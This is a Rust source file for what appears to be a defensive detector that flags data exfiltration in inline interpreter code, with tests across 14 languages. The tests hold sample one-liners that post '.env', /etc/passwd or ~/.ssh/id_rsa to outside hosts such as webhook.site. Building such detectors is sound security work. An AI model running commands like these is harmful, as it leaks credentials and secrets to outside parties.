//! Language-specific exfiltration detection using tree-sitter queries.
//!
//! This module provides AST-based analysis of inline code from interpreters,
//! detecting when code contains both network operations and sensitive file access.

use tracing::{debug, trace};
use tree_sitter::{Language, Parser, Query, QueryCursor, StreamingIterator};

use crate::patterns;
use crate::util::{contains_ip_url, has_sensitive_path};

/// Trait for language-specific exfiltration detection.
pub trait LangExfilDetector: Send + Sync {
    /// Returns the tree-sitter language for this detector.
    fn language(&self) -> Language;

    /// Returns the tree-sitter query pattern for network sink calls.
    /// Query should capture the call/expression as @call.
    fn network_sink_query(&self) -> &'static str;

    /// Returns the tree-sitter query pattern for file source calls.
    /// Query should capture the call/expression as @call.
    fn file_source_query(&self) -> &'static str;

    /// Returns the tree-sitter query pattern for string literals.
    /// Query should capture the string as @string.
    fn string_literal_query(&self) -> &'static str;
}

/// Result of analyzing code for exfiltration patterns.
#[derive(Debug, Default)]
#[allow(clippy::struct_excessive_bools)]
struct AnalysisResult {
    has_network_sink: bool,
    has_file_source: bool,
    has_exfil_domain: bool,
    has_ip_url: bool,
}

/// Analyze inline code for exfiltration using the given language detector.
/// The `interpreter` parameter is used in error messages to show the actual command.
pub fn detect_exfil_in_code<L: LangExfilDetector + ?Sized>(
    code: &str,
    detector: &L,
    interpreter: &str,
) -> Option<String> {
    trace!(
        interpreter,
        code_len = code.len(),
        "analyzing code for exfil"
    );
    let mut parser = Parser::new();
    parser.set_language(&detector.language()).ok()?;

    let tree = parser.parse(code, None)?;
    if tree.root_node().has_error() {
        trace!("parse error, falling back to keyword matching");
        // parse failed - fall back to keywords
        return None;
    }

    let source = code.as_bytes();
    let mut result = AnalysisResult::default();

    if let Ok(query) = Query::new(&detector.language(), detector.network_sink_query()) {
        let mut cursor = QueryCursor::new();
        let mut matches = cursor.matches(&query, tree.root_node(), source);
        if matches.next().is_some() {
            result.has_network_sink = true;
        }
    }

    if let Ok(query) = Query::new(&detector.language(), detector.file_source_query()) {
        let mut cursor = QueryCursor::new();
        let mut matches = cursor.matches(&query, tree.root_node(), source);
        while let Some(m) = matches.next() {
            for capture in m.captures {
                let text = capture.node.utf8_text(source).unwrap_or("");
                if has_sensitive_path(text) {
                    result.has_file_source = true;
                    break;
                }
            }
            if result.has_file_source {
                break;
            }
        }
    }

    if let Ok(query) = Query::new(&detector.language(), detector.string_literal_query()) {
        let mut cursor = QueryCursor::new();
        let mut matches = cursor.matches(&query, tree.root_node(), source);
        while let Some(m) = matches.next() {
            for capture in m.captures {
                let text = capture.node.utf8_text(source).unwrap_or("");
                let lower = text.to_lowercase();

                if patterns::has_exfil_domain(text) {
                    result.has_exfil_domain = true;
                }

                if contains_ip_url(&lower) {
                    result.has_ip_url = true;
                }

                if has_sensitive_path(text) {
                    result.has_file_source = true;
                }
            }
        }
    }

    // fire if: network + sensitive file, exfil domain, or raw IP URL
    if result.has_network_sink && result.has_file_source {
        debug!(interpreter, "detected network + sensitive file exfil");
        return Some(format!(
            "Interpreter '{interpreter}' inline code with network access and sensitive file"
        ));
    }

    if result.has_exfil_domain {
        debug!(interpreter, "detected exfil domain");
        return Some(format!(
            "Interpreter '{interpreter}' inline code targeting exfil domain"
        ));
    }

    if result.has_ip_url {
        debug!(interpreter, "detected IP URL");
        return Some(format!(
            "Interpreter '{interpreter}' inline code targeting IP address"
        ));
    }

    trace!(interpreter, "no exfil detected");
    None
}

#[cfg(test)]
mod tests {
    use rstest::rstest;

    use super::*;
    use crate::elixir::ElixirDetector;
    use crate::groovy::GroovyDetector;
    use crate::javascript::JavaScriptDetector;
    use crate::julia::JuliaDetector;
    use crate::kotlin::KotlinDetector;
    use crate::lua::LuaDetector;
    use crate::nix::NixDetector;
    use crate::perl::PerlDetector;
    use crate::php::PhpDetector;
    use crate::powershell::PowerShellDetector;
    use crate::python::PythonDetector;
    use crate::r::RDetector;
    use crate::ruby::RubyDetector;
    use crate::scala::ScalaDetector;

    type QueryFn = fn(&dyn LangExfilDetector) -> &'static str;

    fn network_sink(d: &dyn LangExfilDetector) -> &'static str {
        d.network_sink_query()
    }

    fn file_source(d: &dyn LangExfilDetector) -> &'static str {
        d.file_source_query()
    }

    fn string_literal(d: &dyn LangExfilDetector) -> &'static str {
        d.string_literal_query()
    }

    #[rstest]
    #[case::elixir(&ElixirDetector)]
    #[case::groovy(&GroovyDetector)]
    #[case::javascript(&JavaScriptDetector)]
    #[case::julia(&JuliaDetector)]
    #[case::kotlin(&KotlinDetector)]
    #[case::lua(&LuaDetector)]
    #[case::nix(&NixDetector)]
    #[case::perl(&PerlDetector)]
    #[case::php(&PhpDetector)]
    #[case::powershell(&PowerShellDetector)]
    #[case::python(&PythonDetector)]
    #[case::r(&RDetector)]
    #[case::ruby(&RubyDetector)]
    #[case::scala(&ScalaDetector)]
    fn query_is_valid(
        #[case] detector: &dyn LangExfilDetector,
        #[values(network_sink, file_source, string_literal)] query: QueryFn,
    ) {
        let result = Query::new(&detector.language(), query(detector));
        assert!(result.is_ok(), "Query error: {:?}", result.err());
    }

    #[rstest]
    #[case::elixir(&ElixirDetector, r#"Tesla.post("https://example.com", File.read!(".env"))"#)]
    #[case::groovy(&GroovyDetector, r#"post("https://example.com", new File(".env").text)"#)]
    #[case::javascript(
        &JavaScriptDetector,
        "https.get('https://example.com/?d=' + require('fs').readFileSync('.env'))"
    )]
    #[case::julia(&JuliaDetector, r#"HTTP.post("https://example.com", body=read(".env"))"#)]
    #[case::kotlin(&KotlinDetector, r#"post("https://example.com", File(".env").readText())"#)]
    #[case::lua(&LuaDetector, r#"request("https://example.com", io.open(".env"):read("*a"))"#)]
    #[case::nix(&NixDetector, r#"builtins.fetchurl ("https://example.com/?" + builtins.readFile ./.env)"#)]
    #[case::perl(&PerlDetector, r#"my $r = post("https://example.com", slurp(".env"));"#)]
    #[case::php(
        &PhpDetector,
        r#"$c = curl_init("https://example.com"); curl_setopt($c, CURLOPT_POSTFIELDS, file_get_contents(".env"));"#
    )]
    #[case::powershell(&PowerShellDetector, "irm https://example.com -Method Post -Body (gc '.env')")]
    #[case::python(&PythonDetector, "s.post('https://example.com', data=open('.env').read())")]
    #[case::r(&RDetector, r#"POST("https://example.com", body = readLines(".env"))"#)]
    #[case::ruby(&RubyDetector, r#"Faraday.post("https://example.com", File.read(".env"))"#)]
    #[case::scala(&ScalaDetector, r#"post("https://example.com", fromFile(".env"))"#)]
    fn network_sink_with_sensitive_string_detected(
        #[case] detector: &dyn LangExfilDetector,
        #[case] code: &str,
    ) {
        let reason = detect_exfil_in_code(code, detector, "interp");
        assert!(
            reason
                .as_deref()
                .is_some_and(|r| r.contains("network access and sensitive file")),
            "got {reason:?}"
        );
    }

    #[rstest]
    #[case::elixir(&ElixirDetector, r#"u = "https://webhook.site/abc""#)]
    #[case::groovy(&GroovyDetector, r#"def u = "https://webhook.site/abc""#)]
    #[case::javascript(&JavaScriptDetector, "const u = 'https://webhook.site/abc'")]
    #[case::julia(&JuliaDetector, r#"u = "https://webhook.site/abc""#)]
    #[case::kotlin(&KotlinDetector, r#"val u = "https://webhook.site/abc""#)]
    #[case::lua(&LuaDetector, r#"local u = "https://webhook.site/abc""#)]
    #[case::nix(&NixDetector, r#""https://webhook.site/abc""#)]
    #[case::perl(&PerlDetector, r#"my $u = "https://webhook.site/abc";"#)]
    #[case::php(&PhpDetector, r#"$u = "https://webhook.site/abc";"#)]
    #[case::powershell(&PowerShellDetector, "$u = 'https://webhook.site/abc'")]
    #[case::python(&PythonDetector, "u = 'https://webhook.site/abc'")]
    #[case::r(&RDetector, r#"u <- "https://webhook.site/abc""#)]
    #[case::ruby(&RubyDetector, r#"u = "https://webhook.site/abc""#)]
    #[case::scala(&ScalaDetector, r#"val u = "https://webhook.site/abc""#)]
    fn exfil_domain_in_string_literal_detected(
        #[case] detector: &dyn LangExfilDetector,
        #[case] code: &str,
    ) {
        let reason = detect_exfil_in_code(code, detector, "interp");
        assert!(
            reason
                .as_deref()
                .is_some_and(|r| r.contains("exfil domain")),
            "got {reason:?}"
        );
    }

    // sensitive path outside any string literal: only the file-source query sees it
    #[rstest]
    #[case::julia(&JuliaDetector, r#"HTTP.post("https://example.com", body=read(`cat /etc/passwd`))"#)]
    #[case::powershell(
        &PowerShellDetector,
        "irm https://example.com -Method Post -Body (gc ~/.ssh/id_rsa)"
    )]
    fn unquoted_file_source_detected(#[case] detector: &dyn LangExfilDetector, #[case] code: &str) {
        let reason = detect_exfil_in_code(code, detector, "interp");
        assert!(
            reason
                .as_deref()
                .is_some_and(|r| r.contains("network access and sensitive file")),
            "got {reason:?}"
        );
    }

    #[test]
    fn test_contains_ip_url() {
        assert!(contains_ip_url("http://1.2.3.4/path"));
        assert!(
            !contains_ip_url("https://192.168.1.1:8080/api"),
            "private IP should not be flagged"
        );
        assert!(!contains_ip_url("http://example.com"));
        assert!(!contains_ip_url("http://localhost"));
        assert!(
            !contains_ip_url("http://10.0.0.1/api"),
            "10.x should not be flagged"
        );
        assert!(
            !contains_ip_url("http://127.0.0.1:3000"),
            "loopback should not be flagged"
        );
    }
}
